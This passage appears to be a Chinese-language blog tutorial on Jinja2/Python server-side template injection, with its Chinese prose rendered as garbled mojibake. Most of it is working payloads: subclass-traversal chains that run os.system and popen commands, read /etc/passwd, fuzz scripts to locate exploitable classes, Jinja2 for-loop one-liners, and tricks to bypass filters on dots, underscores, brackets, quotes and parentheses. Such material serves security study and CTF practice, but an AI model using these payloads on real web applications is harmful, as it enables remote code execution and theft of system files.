<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__</span><br><span class="line">(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;class &#39;list&#39;&gt;, &lt;class &#39;object&#39;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;class &#39;object&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>3ã€å¯»æ‰¾å¯ç”¨çš„å¼•ç”¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()</span><br><span class="line">[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;rlcompleter.Completer&#39;&gt;]</span><br></pre></td></tr></table></figure>

<p>4ã€æ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ</p>
<p>3ä¸ªæœ¬åœ°æµ‹è¯•æˆåŠŸçš„payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">93</span><br><span class="line">&lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;</span><br><span class="line">127</span><br><span class="line">&lt;class &#39;os._wrap_close&#39;&gt;</span><br><span class="line">-1</span><br><span class="line">&lt;class &#39;rlcompleter.Completer&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è§‚å¯Ÿï¼Œå…¶å®å°±æ˜¯<code>__global__</code>ä¸­å­˜åœ¨<code>sys</code>æˆ–è€…<code>system</code>æˆ–è€…<code>__builtins__</code>æ¨¡å—</p>
<p>FUZZè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> <span class="string">'system'</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">             print(<span class="string">'system'</span>,num,item)</span><br><span class="line">         <span class="keyword">if</span> <span class="string">'sys'</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">             print(<span class="string">'sys'</span>,num,item)</span><br><span class="line">         <span class="keyword">if</span> <span class="string">'__builtins__'</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">         	 print(<span class="string">'__builtins__'</span>,num,item)</span><br><span class="line">         num+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span></span><br><span class="line">        num+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>fuzzå‡ºå¾ˆå¤šå…¶ä»–çš„ï¼Œæµ‹è¯•ä¸€ä¸‹</p>
<img src="https://i.loli.net/2020/02/24/ynWGKe9NoX7vJrD.png" alt="Snipaste_2020-02-24_15-12-51.png" style="zoom:67%;">

<p>å°è¯•è‡ªå·±æ„é€ forå¾ªç¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if &#39;sys&#39; in c.__init__.__globals__ %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/02/24/4QkOHi6lTNpsA7X.png" alt="Snipaste_2020-02-24_15-33-14.png" style="zoom:67%;">

<p>ä¸€ä¸ª0ä»£è¡¨æ‰§è¡Œä¸€æ¬¡ğŸ¤¦â€â™‚ï¸ï¼Œå‘½ä»¤æ‰§è¡Œçš„ç»“æœæ— æ³•å›æ˜¾ï¼Œåˆ©ç”¨curlå¸¦å‡º</p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥æŒ‡å®šæ¨¡å—åï¼Œå°±å¯ä»¥åªæ‰§è¡Œä¸€æ¬¡ï¼Œæ¯”å¦‚å‰é¢FUZZå‡ºæ¥çš„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys 128 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„æ˜¯ååŠéƒ¨åˆ†<code>Quitter</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>ä¸Šé¢ä¸‰ä¸ªæ¨¡å—ä¸­<code>__builtins__</code>æœ€ä¸ºä¸°å¯Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ¯”å¦‚è¿˜æœ‰chr()å‡½æ•°</p>
</blockquote>
<p>Jinja2çš„forå¾ªç¯å¤„ç†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>evalæ‰§è¡Œçš„å¥½å¤„æ˜¯ç›´æ¥æœ‰å›æ˜¾ï¼Œ</p>
<img src="https://i.loli.net/2020/02/24/v4n2wamzGpJxyct.png" alt="Snipaste_2020-02-24_16-09-37.png" style="zoom:67%;">



<h4><span id="some-tricksæµ‹è¯•ç¯å¢ƒä¸ºpy2">Some Tricksï¼ˆæµ‹è¯•ç¯å¢ƒä¸ºPy2ï¼‰</span></h4><p><strong><code>.</code>è¢«è¿‡æ»¤</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>getattr()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[].__class__	&#x3D;&gt;	getattr([],&#39;__class__&#39;)</span><br><span class="line">[].__class__.__base__	&#x3D;&gt;	getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[59]	&#x3D;&gt;	getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59]</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__	&#x3D;&gt;	getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;)</span><br><span class="line">...</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;),&#39;__globals__&#39;)[&#39;linecache&#39;],&#39;__dict__&#39;)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p><strong><code>_</code>è¢«è¿‡æ»¤</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;base&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;linecache&#39;],dir(0)[0][0]*2+&#39;dict&#39;+dir(0)[0][0]*2)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p><strong>ä¸­æ‹¬å·è¢«è¿‡æ»¤</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>

<p> å¯ä»¥ç”¨<code>getitem</code>å’Œ<code>pop</code>è¿›è¡Œç»•è¿‡è¿‡æ»¤ </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(58).__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>

<p><strong>å¼•å·è¢«è¿‡æ»¤</strong></p>
<p>å…ˆè·å–chr()å†å°†æ–‡ä»¶åæ‹¼æ¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/02/24/jw7sStYhX534kTa.png" alt="Snipaste_2020-02-24_16-59-07.png" style="zoom:67%;">

<p><strong>è¿‡æ»¤åŒæ‹¬å·))</strong></p>
<p>åˆ©ç”¨æ–‡ä»¶ç›²æ³¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;aa&#39;).read()[0:1]&#x3D;&#x3D;&#39;f&#39; %&#125;~ok~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>å†™ä¸ªè„šæœ¬å³å¯</p>
<hr>
<h4><span id="æ€»ç»“">æ€»ç»“</span></h4><p>é€šç”¨çš„payload</p>
<p><strong>åŸºç±»</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1]</span><br><span class="line">().__class__.__base__</span><br></pre></td></tr></table></figure>

<p><strong>Python 2.7</strong></p>
<p><code>&lt;type &#39;file&#39;&gt;</code></p>
<blockquote>
<p>ä¸‹æ ‡ä¸€èˆ¬æ˜¯40ï¼Œå¦‚æœä¸è¡Œçš„è¯ä¹Ÿå¯çˆ†ç ´è¯•è¯•</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>

<p><code>os</code>ã€<code>__builtins__</code>ã€<code>linecache</code>æ¨¡å—</p>
<p><code>å¯»æ‰¾ç›¸åº”æ¨¡å—.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">list = [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>, <span class="string">'linecache'</span>]</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">                print(i, num, item)</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'-'</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/02/24/VhvMFANZCy7m9fz.png" alt="Snipaste_2020-02-24_17-24-58.png" style="zoom:67%;">

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;)</span><br><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰å¾ˆå¤šå˜å½¢å¯ä»¥å‚è€ƒä¸Šé¢çš„</p>
<p>jinja2çš„forå¾ªç¯ä¸€æŠŠæ¢­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Python 3.7</strong></p>
<p><code>sys</code>ã€<code>system</code>ã€<code>__builtins__</code>æ¨¡å—ï¼Œå…¶ä¸­<code>__builtins__</code>å’Œpython2çš„ç•¥æœ‰ä¸åŒ</p>
<p><code>å¯»æ‰¾ç›¸åº”æ¨¡å—.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">list = [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">                print(i, num, item)</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'-'</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/02/24/WAyTklhRX4iYeOa.png" alt="Snipaste_2020-02-24_17-46-26.png" style="zoom:67%;">

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>jinja2çš„forå¾ªç¯ä¸€æŠŠæ¢­</p>
